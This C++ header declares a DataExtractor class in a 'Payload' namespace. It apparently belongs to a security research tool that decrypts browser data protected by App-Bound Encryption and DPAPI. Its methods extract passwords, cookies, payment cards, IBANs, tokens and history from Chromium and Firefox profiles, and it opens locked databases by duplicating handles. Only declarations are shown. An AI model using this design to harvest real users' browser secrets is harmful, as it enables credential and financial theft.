// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include "pipe_client.hpp"
#include "../../libs/sqlite/sqlite3.h"
#include <vector>
#include <string>
#include <optional>
#include <filesystem>

namespace Payload {

    class DataExtractor {
    public:
        struct MasterKeys {
            std::vector<uint8_t> abe;
            std::vector<uint8_t> dpapi;
        };

    private:
        void ExtractWebRTC(const std::filesystem::path& prefsPath, const std::filesystem::path& outFile);
    public:
        DataExtractor(PipeClient& pipe, const MasterKeys& keys, const std::filesystem::path& outputBase, bool isGecko = false);

        void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);
        void ProcessUnencrypted(const std::filesystem::path& profilePath, const std::string& browserName);

    private:
        void ProcessGeckoProfile(const std::filesystem::path& profilePath, const std::string& browserName);
        void ExtractFirefoxCookies(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractFirefoxHistory(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractFirefoxBookmarks(sqlite3* db, const std::filesystem::path& outFile);

        sqlite3* OpenDatabase(const std::filesystem::path& dbPath);
        sqlite3* OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath);
        void CleanupTempFiles();

        void ExtractCookies(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractCards(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractTokens(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractAutofill(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractHistory(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractBookmarks(const std::filesystem::path& bookmarksPath, const std::filesystem::path& outFile);
        void ExtractDownloads(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractLocalStorage(const std::filesystem::path& lsPath, const std::filesystem::path& outFile);

        std::optional<std::vector<uint8_t>> DecryptBlob(const std::vector<uint8_t>& encrypted);

        std::string FormatWebKitTimestamp(int64_t webkitTimestamp);
        std::string EscapeJson(const std::string& s);

        bool m_isGecko;
        PipeClient& m_pipe;
        MasterKeys m_keys;
        std::filesystem::path m_outputBase;

        std::vector<std::filesystem::path> m_tempFiles;
    };

}
